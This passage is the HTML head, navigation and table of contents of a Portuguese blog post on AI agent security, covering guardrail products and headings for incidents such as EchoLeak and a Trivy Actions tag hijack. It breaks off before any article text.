@@ -1,0 +1,2288 @@
+
+<!doctype html>
+<html lang="pt" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Porque os guardrails de LLM não são suficientes para a segurança de agentes de IA, e onde entram permissões, sandboxes, HITL, scoping de MCP e verificações de política.">
+      
+      
+        <meta name="author" content="Viacheslav Dubrov">
+      
+      
+        <link rel="canonical" href="https://slavadubrov.github.io/pt/blog/2026/04/20/the-guardians--why-agent-security-is-not-llm-safety/">
+      
+      
+      
+      
+        
+          <link rel="alternate" href="../../../../../../blog/2026/04/20/the-guardians--why-agent-security-is-not-llm-safety/" hreflang="en">
+        
+          <link rel="alternate" href="../../../../../../de/blog/2026/04/20/the-guardians--why-agent-security-is-not-llm-safety/" hreflang="de">
+        
+          <link rel="alternate" href="../../../../../../ru/blog/2026/04/20/the-guardians--why-agent-security-is-not-llm-safety/" hreflang="ru">
+        
+          <link rel="alternate" href="../../../../../../es/blog/2026/04/20/the-guardians--why-agent-security-is-not-llm-safety/" hreflang="es">
+        
+          <link rel="alternate" href="./" hreflang="pt">
+        
+          <link rel="alternate" href="../../../../../../fr/blog/2026/04/20/the-guardians--why-agent-security-is-not-llm-safety/" hreflang="fr">
+        
+          <link rel="alternate" href="../../../../../../nl/blog/2026/04/20/the-guardians--why-agent-security-is-not-llm-safety/" hreflang="nl">
+        
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="canal RSS" href="../../../../../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="canal RSS com conteúdo atualizado" href="../../../../../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../../../../../assets/favicon-eoc.svg">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Segurança de Agentes de IA em 2026: Guardrails, Permissões, Sandboxes e Ameaças MCP - Edge of Context: Practical AI Engineering</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../../assets/brand.css">
+    
+      <link rel="stylesheet" href="../../../../../../assets/blog-sidebar.css">
+    
+    <script>__md_scope=new URL("../../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+  
+
+
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-T51K83ENZ5"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-T51K83ENZ5",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-T51K83ENZ5",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+  
+    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
+  
+
+    
+        
+
+
+<!-- Open Graph -->
+<meta property="og:title" content="Segurança de Agentes de IA em 2026: Guardrails, Permissões, Sandboxes e Ameaças MCP" />
+<meta property="og:description" content="Porque os guardrails de LLM não são suficientes para a segurança de agentes de IA, e onde entram permissões, sandboxes, HITL, scoping de MCP e verificações de política." />
+<meta property="og:url" content="https://slavadubrov.github.io/pt/blog/2026/04/20/the-guardians--why-agent-security-is-not-llm-safety/" />
+<meta property="og:site_name" content="Edge of Context: Practical AI Engineering" />
+<meta
+  property="og:type"
+  content="article"
+/>
+<meta property="og:image" content="https://slavadubrov.github.io/assets/logo-eoc.svg" />
+<!-- Twitter Card -->
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Segurança de Agentes de IA em 2026: Guardrails, Permissões, Sandboxes e Ameaças MCP" />
+<meta name="twitter:description" content="Porque os guardrails de LLM não são suficientes para a segurança de agentes de IA, e onde entram permissões, sandboxes, HITL, scoping de MCP e verificações de política." />
+<meta name="twitter:image" content="https://slavadubrov.github.io/assets/logo-eoc.svg" />
+<!-- Site identity schema -->
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "Person",
+        "@id": "https://slavadubrov.github.io/#person",
+        "name": "Viacheslav Dubrov",
+        "alternateName": "Slava Dubrov",
+        "url": "https://slavadubrov.github.io/about/",
+        "sameAs": ["https://www.linkedin.com/in/slavadubrov", "https://github.com/slavadubrov", "https://slavadubrov.substack.com/"]
+      },
+      {
+        "@type": "WebSite",
+        "@id": "https://slavadubrov.github.io/#website",
+        "name": "Edge of Context: Practical AI Engineering",
+        "alternateName": "Edge of Context",
+        "url": "https://slavadubrov.github.io/",
+        "description": "Practical AI engineering articles by Slava Dubrov on production AI agents, LLM infrastructure, RAG, search, fine-tuning, and tooling.",
+        "inLanguage": "pt",
+        "publisher": {
+          "@id": "https://slavadubrov.github.io/#person"
+        }
+      },
+      {
+        "@type": "Blog",
+        "@id": "https://slavadubrov.github.io/#blog",
+        "name": "Edge of Context: Practical AI Engineering",
+        "url": "https://slavadubrov.github.io/blog/",
+        "description": "Practical AI engineering articles by Slava Dubrov on production AI agents, LLM infrastructure, RAG, search, fine-tuning, and tooling.",
+        "inLanguage": "pt",
+        "author": {
+          "@id": "https://slavadubrov.github.io/#person"
+        },
+        "publisher": {
+          "@id": "https://slavadubrov.github.io/#person"
+        },
+        "isPartOf": {
+          "@id": "https://slavadubrov.github.io/#website"
+        }
+      }
+    ]
+  }
+</script>
+
+<style>
+  /* Header social icons */
+  .md-header__social {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    margin-left: 0.5rem;
+  }
+  .md-header__social a {
+    color: var(--md-primary-bg-color);
+    opacity: 0.7;
+    transition: opacity 0.2s;
+  }
+  .md-header__social a:hover {
+    opacity: 1;
+  }
+  .md-header__social svg {
+    width: 1.2rem;
+    height: 1.2rem;
+    fill: currentColor;
+  }
+  /* Adjust search to make room for social icons */
+  .md-search {
+    margin-right: 0;
+  }
+</style>
+
+<!-- Article-specific Open Graph -->
+   
+<meta property="article:published_time" content="2026-04-20" />
+ 
+<meta property="article:modified_time" content="2026-05-31" />
+ 
+<meta property="article:author" content="Viacheslav Dubrov" />
+
+<!-- Schema.org JSON-LD -->
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "@id": "https://slavadubrov.github.io/pt/blog/2026/04/20/the-guardians--why-agent-security-is-not-llm-safety/#blogposting",
+    "headline": "Seguran\u00e7a de Agentes de IA em 2026: Guardrails, Permiss\u00f5es, Sandboxes e Amea\u00e7as MCP",
+    "description": "Porque os guardrails de LLM n\u00e3o s\u00e3o suficientes para a seguran\u00e7a de agentes de IA, e onde entram permiss\u00f5es, sandboxes, HITL, scoping de MCP e verifica\u00e7\u00f5es de pol\u00edtica.",
+    "url": "https://slavadubrov.github.io/pt/blog/2026/04/20/the-guardians--why-agent-security-is-not-llm-safety/",
+    "image": "https://slavadubrov.github.io/assets/logo-eoc.svg",
+    "inLanguage": "pt",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https://slavadubrov.github.io/pt/blog/2026/04/20/the-guardians--why-agent-security-is-not-llm-safety/"
+    },
+    "datePublished": "2026-04-20",
+    "dateModified": "2026-05-31",
+    "author": {
+      "@type": "Person",
+      "@id": "https://slavadubrov.github.io/#person",
+      "name": "Viacheslav Dubrov",
+      "alternateName": "Slava Dubrov",
+      "url": "https://slavadubrov.github.io/about/",
+      "sameAs": ["https://www.linkedin.com/in/slavadubrov", "https://github.com/slavadubrov", "https://slavadubrov.substack.com/"]
+    },
+    "publisher": {
+      "@type": "Person",
+      "@id": "https://slavadubrov.github.io/#person",
+      "name": "Viacheslav Dubrov",
+      "alternateName": "Slava Dubrov",
+      "url": "https://slavadubrov.github.io/about/",
+      "sameAs": ["https://www.linkedin.com/in/slavadubrov", "https://github.com/slavadubrov", "https://slavadubrov.substack.com/"]
+    },
+    "isPartOf": {
+      "@type": "Blog",
+      "@id": "https://slavadubrov.github.io/#blog",
+      "name": "Edge of Context: Practical AI Engineering",
+      "url": "https://slavadubrov.github.io/"
+    },
+    "keywords": "Agents 101"
+  }
+</script>
+
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#seguranca-de-agentes-de-ia-em-2026-guardrails-permissoes-sandboxes-e-ameacas-mcp" class="md-skip">
+          Ir para o conteúdo
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+     
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabeçalho">
+    <a href="../../../../../" title="Edge of Context: Practical AI Engineering" class="md-header__button md-logo" aria-label="Edge of Context: Practical AI Engineering" data-md-component="logo">
+      
+  <img src="../../../../../../assets/logo-eoc.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Edge of Context: Practical AI Engineering
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Segurança de Agentes de IA em 2026: Guardrails, Permissões, Sandboxes e Ameaças MCP
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+      <div class="md-header__option">
+  <div class="md-select">
+    
+    <button class="md-header__button md-icon" aria-label="Selecione o idioma">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m12.87 15.07-2.54-2.51.03-.03A17.5 17.5 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2zm-2.62 7 1.62-4.33L19.12 17z"/></svg>
+    </button>
+    <div class="md-select__inner">
+      <ul class="md-select__list">
+        
+          <li class="md-select__item">
+            <a href="../../../../../../blog/2026/04/20/the-guardians--why-agent-security-is-not-llm-safety/" hreflang="en" class="md-select__link">
+              English
+            </a>
+          </li>
+        
+          <li class="md-select__item">
+            <a href="../../../../../../de/blog/2026/04/20/the-guardians--why-agent-security-is-not-llm-safety/" hreflang="de" class="md-select__link">
+              Deutsch
+            </a>
+          </li>
+        
+          <li class="md-select__item">
+            <a href="../../../../../../ru/blog/2026/04/20/the-guardians--why-agent-security-is-not-llm-safety/" hreflang="ru" class="md-select__link">
+              Русский
+            </a>
+          </li>
+        
+          <li class="md-select__item">
+            <a href="../../../../../../es/blog/2026/04/20/the-guardians--why-agent-security-is-not-llm-safety/" hreflang="es" class="md-select__link">
+              Español
+            </a>
+          </li>
+        
+          <li class="md-select__item">
+            <a href="./" hreflang="pt" class="md-select__link">
+              Português
+            </a>
+          </li>
+        
+          <li class="md-select__item">
+            <a href="../../../../../../fr/blog/2026/04/20/the-guardians--why-agent-security-is-not-llm-safety/" hreflang="fr" class="md-select__link">
+              Français
+            </a>
+          </li>
+        
+          <li class="md-select__item">
+            <a href="../../../../../../nl/blog/2026/04/20/the-guardians--why-agent-security-is-not-llm-safety/" hreflang="nl" class="md-select__link">
+              Nederlands
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Buscar" placeholder="Buscar" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Pesquisar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpar" aria-label="Limpar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando a pesquisa
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Abas" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Início
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Blog
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../about/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Sobre
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+<script>
+  // Inject social icons into header after DOM loads
+  document.addEventListener("DOMContentLoaded", function () {
+    const header = document.querySelector(".md-header__inner");
+    if (header) {
+      const social = document.createElement("div");
+      social.className = "md-header__social";
+      social.innerHTML = `
+      <a href="https://www.linkedin.com/in/slavadubrov" title="LinkedIn" target="_blank" rel="noopener">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+      </a>
+      <a href="https://slavadubrov.substack.com/" title="Substack" target="_blank" rel="noopener">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M22.539 8.242H1.46V5.406h21.08v2.836zM1.46 10.812V24L12 18.11 22.54 24V10.812H1.46zM22.54 0H1.46v2.836h21.08V0z"/></svg>
+      </a>
+      <a href="https://github.com/slavadubrov" title="GitHub" target="_blank" rel="noopener">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+      </a>
+    `;
+      header.appendChild(social);
+    }
+  });
+</script>
+
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navegação" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../../" title="Edge of Context: Practical AI Engineering" class="md-nav__button md-logo" aria-label="Edge of Context: Practical AI Engineering" data-md-component="logo">
+      
+  <img src="../../../../../../assets/logo-eoc.svg" alt="logo">
+
+    </a>
+    Edge of Context: Practical AI Engineering
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Início
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blog
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Blog
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Sobre
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Índice">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Índice
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#porque-e-que-a-seguranca-de-agentes-de-ia-e-diferente-da-seguranca-de-llms" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Porque é que a segurança de agentes de IA é diferente da segurança de LLMs
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#o-que-os-llm-guardrails-realmente-cobrem" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        O que os LLM Guardrails realmente cobrem
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="O que os LLM Guardrails realmente cobrem">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nvidia-nemo-guardrails" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NVIDIA NeMo Guardrails
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#meta-llama-guard-4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Meta Llama Guard 4
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#guardrails-ai" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Guardrails AI
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lakera-guard" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lakera Guard
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#aws-bedrock-guardrails" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AWS Bedrock Guardrails
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#azure-ai-content-safety" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Azure AI Content Safety
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#openai-moderation-and-openai-guardrails" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OpenAI Moderation and OpenAI Guardrails
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#o-padrao-por-baixo-dos-produtos" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        O padrão por baixo dos produtos
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ameacas-a-seguranca-de-agentes-de-ia-seis-incidentes-e-o-top-10-owasp-asi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Ameaças à segurança de agentes de IA: seis incidentes e o Top 10 OWASP ASI
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Ameaças à segurança de agentes de IA: seis incidentes e o Top 10 OWASP ASI">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#echoleak-cve-2025-32711-cvss-93" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        EchoLeak — CVE-2025-32711, CVSS 9.3
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#amazon-q-developer-vs-code-v1840-julho-de-2025" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Amazon Q Developer VS Code v1.84.0 — julho de 2025
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#azure-mcp-server-cve-2026-32211-cvss-91" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Azure MCP Server — CVE-2026-32211, CVSS 9.1
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#claude-code-cve-2025-59536-cvss-87" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Claude Code CVE-2025-59536 — CVSS 8.7
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#axios-1141-31-de-marco-de-2026" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Axios 1.14.1 — 31 de março de 2026
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#trivy-actions-tag-hijack-ghsa-69fq-xp46-6x23-19-de-marco-de-2026" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Trivy Actions Tag Hijack — GHSA-69fq-xp46-6x23, 19 de março de 2026
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
